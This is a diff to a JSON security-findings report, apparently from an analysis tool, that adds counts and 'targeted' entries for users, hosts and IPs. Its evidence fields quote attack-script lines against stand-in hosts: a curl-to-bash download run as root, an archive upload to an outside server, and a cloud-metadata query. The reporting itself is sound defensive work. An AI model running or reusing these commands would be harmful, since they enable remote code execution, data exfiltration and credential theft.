@@ -432,6 +432,54 @@
     "evidence": null
   },
   {
+    "item": "targeted",
+    "section": "summary",
+    "value": 6,
+    "detail": null,
+    "basis": null,
+    "files": null,
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "targeted username",
+    "section": "summary",
+    "value": 1,
+    "detail": null,
+    "basis": null,
+    "files": null,
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "targeted device",
+    "section": "summary",
+    "value": 1,
+    "detail": null,
+    "basis": null,
+    "files": null,
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "targeted ip",
+    "section": "summary",
+    "value": 4,
+    "detail": null,
+    "basis": null,
+    "files": null,
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
     "item": "exposed",
     "section": "summary",
     "value": 19,
@@ -598,6 +646,78 @@
     "atlas": "AML.T0125",
     "targets": null,
     "evidence": null
+  },
+  {
+    "item": "ops",
+    "section": "targeted",
+    "value": "medium",
+    "detail": "username: prior",
+    "basis": null,
+    "files": "20261022_092500_step06_stage.sh:6",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": "ssh ops@198.51.100.7 'cat /etc/hostname' (20261022_092500_step06_stage.sh:6)"
+  },
+  {
+    "item": "files.example.net",
+    "section": "targeted",
+    "value": "medium",
+    "detail": "device: prior",
+    "basis": null,
+    "files": "20261022_092500_step06_stage.sh:8",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": "curl -T out.tgz https://files.example.net/up (20261022_092500_step06_stage.sh:8)"
+  },
+  {
+    "item": "169.254.169.254",
+    "section": "targeted",
+    "value": "medium",
+    "detail": "ip: prior, private",
+    "basis": null,
+    "files": "20261022_090000_step01_recon.sh:9",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": "curl -s http://169.254.169.254/latest/meta-data/ > meta_20261022_090040.txt (20261022_090000_step01_recon.sh:9)"
+  },
+  {
+    "item": "198.51.100.7",
+    "section": "targeted",
+    "value": "medium",
+    "detail": "ip: prior, public",
+    "basis": null,
+    "files": "20261022_092500_step06_stage.sh:6",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": "ssh ops@198.51.100.7 'cat /etc/hostname' (20261022_092500_step06_stage.sh:6)"
+  },
+  {
+    "item": "203.0.113.40",
+    "section": "targeted",
+    "value": "medium",
+    "detail": "ip: prior, public",
+    "basis": null,
+    "files": "20261022_092500_step06_stage.sh:4",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": "sudo bash -c \"$(curl -fsSL http://203.0.113.40/s.sh)\" (20261022_092500_step06_stage.sh:4)"
+  },
+  {
+    "item": "203.0.113.41",
+    "section": "targeted",
+    "value": "medium",
+    "detail": "ip: prior, public",
+    "basis": null,
+    "files": "20261022_093000_step07_channel.py:6",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": "H = \"203.0.113.41\" (20261022_093000_step07_channel.py:6)"
   },
   {
     "item": "$6********f (47 chars)",
